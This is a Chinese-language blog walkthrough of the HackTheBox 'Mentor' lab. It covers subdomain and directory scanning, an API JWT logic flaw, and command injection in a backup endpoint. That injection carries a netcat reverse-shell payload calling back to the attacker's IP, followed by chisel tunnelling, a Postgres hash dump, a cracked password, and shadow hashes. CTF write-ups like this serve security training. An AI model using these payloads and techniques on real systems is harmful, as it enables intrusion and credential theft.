---
title: Mentor - HackTheBox
url: https://darkwing.moe/2022/12/11/Mentor-HackTheBox/
source: 喵喵喵喵
date: 2022-12-12
fetch_date: 2025-10-04T01:14:21.820136
---

# Mentor - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Mentor - HackTheBox

# Mentor - HackTheBox

##### 2022-12-11

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.193](#10-10-11-193)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. api.mentorquotes.htb](#api-mentorquotes-htb)
4. [4. 目录扫描](#目录扫描)
   1. [4.1. docs](#docs)
5. [5. API](#API)
   1. [5.1. james](#james)
   2. [5.2. admin](#admin)
   3. [5.3. backup](#backup)
   4. [5.4. 命令注入](#命令注入)
6. [6. docker root](#docker-root)
   1. [6.1. postgresql](#postgresql)
7. [7. user flag](#user-flag)
8. [8. 提权信息](#提权信息)
   1. [8.1. james](#james-1)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Mentor - HackTheBox

2022-12-11

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/518>
* ## 10.10.11.193

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121101.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.193 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-11 21:08 CST Nmap scan report for 10.10.11.193 Host is up (0.32s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA) |_  256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519) 80/tcp open  http    Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://mentorquotes.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 114.15 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.193 mentorquotes.htb ``` |

一个博客：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121102.jpg)

# 子域名扫描

子域名扫描可以发现api，一个小坑，匹配到的时候响应是404，大部分工具默认选项都会忽略这个结果：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://mentorquotes.htb/" -H 'Host: FUZZ.mentorquotes.htb' -fc 302 -mc all  api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 365ms] ``` |

## api.mentorquotes.htb

同样加hosts后访问,默认结果404：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121103.jpg)

# 目录扫描

对api进行目录扫描发现一些结果：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://api.mentorquotes.htb/  /admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/] /docs                 (Status: 200) [Size: 969] /quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/] /server-status        (Status: 403) [Size: 285] /users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/] ``` |

## docs

docs就是API文档,并且可以得到网站管理员的邮箱：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` james@mentorquotes.htb ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121104.jpg)

# API

根据文档调用API，注册登录，得到一个JWT：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121105.jpg)

使用得到的JWT调用其他API例如users，提示需要admin：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121106.jpg)

## james

JWT验证逻辑问题，因为JWT中使用的是username而不是email，那使用我们自己的邮箱，但使用james的用户名注册登录得到的JWT就能够通过admin校验，发现svc用户：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121107.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121108.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121109.jpg)

## admin

现在使用admin JWT访问admin，得到check和backup：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121110.jpg)

## backup

check还没实现，backup需要有效的json post参数：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121111.jpg)

直接提交空json即可得到需要的参数：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121112.jpg)

构造有效参数，响应内容只有Done：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121113.jpg)

## 命令注入

猜测backup实现方式，可以发现path参数的命令注入：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121114.jpg)

# docker root

利用命令注入得到docker容器root：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` {"body":"miao","path":"/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f;"} ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121115.jpg)

## postgresql

db.py中可以得到数据库账号密码，转发端口，查看数据库得到几条hash：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121116.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ``` | ``` # local sudo ./chisel server --port 99999 --reverse # target ./chisel client -v 10.10.14.7:9999 R:5432:172.22.0.1:5432  # local psql -h 10.10.14.7 -U "postgres" -p 5432  postgres=# \list mentorquotes_db postgres template0 template1  postgres=# \c mentorquotes_db mentorquotes_db=# \d mentorquotes_db=# select * from users;  id |          email          |  username   |             password              ----+-------------------------+-------------+----------------------------------   1 | james@mentorquotes.htb  | james       | 7ccdcd8c05b59add9c198d492b36a503   2 | svc@mentorquotes.htb    | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8   4 | dedsec@mentorquotes.htb | james       | fc8767a5e9e2382a17072b10725e1c8b (3 rows) ``` |

svc的hash破解出来密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 123meunomeeivani ``` |

# user flag

svc用户ssh，得到user flag：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121117.jpg)

# 提权信息

运行linpeas之类，发现snmp配置文件最近有更新：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121118.jpg)

## james

查看snmp配置文件得到密码，这个密码就是james密码,james用户可以sudo执行sh：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` cat /etc/snmp/snmpd.conf  createUser bootstrap MD5 SuperSecurePassword123__ DES  su james sudo -l ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121119.jpg)

# 提权 & root flag

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022121120.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` root:$y$j9T$8yCyNLTeGfC2FDUDFE6sM1$e65o4d6wvakq5n8g3gyx.0R2UL1mAkx47MbbSvBE9a5:19292:0:99999:7::: svc:$y$j9T$4EcnvzyhSx1IAnV6cEyg.1$k1QRszqBOGsytZfsfKnslj9/UTcGIsuEBXYpv7DMaE3:19306:0:99999:7::: james:$y$j9T$lIYLeondVze7GxH1PBwcb.$3ultsJbEkyEqFPlWzZyDoWTKC/jZCx4Fy/hLsyxkvH5:19154:0:99999:7::: ``` |

# 参考资料

* Mentor - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Mentor-HTB-Discussion>
* Hackthebox Mentor Writeup – 0xDedinfosec
  <https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup>

> Last updated: 2023-03-13 08:28:39
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Soccer - HackTheBox](/2022/12/19/Soccer-HackTheBox/)

[Next

#### Extension - HackTheBox](/2022/12/04/Extension-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)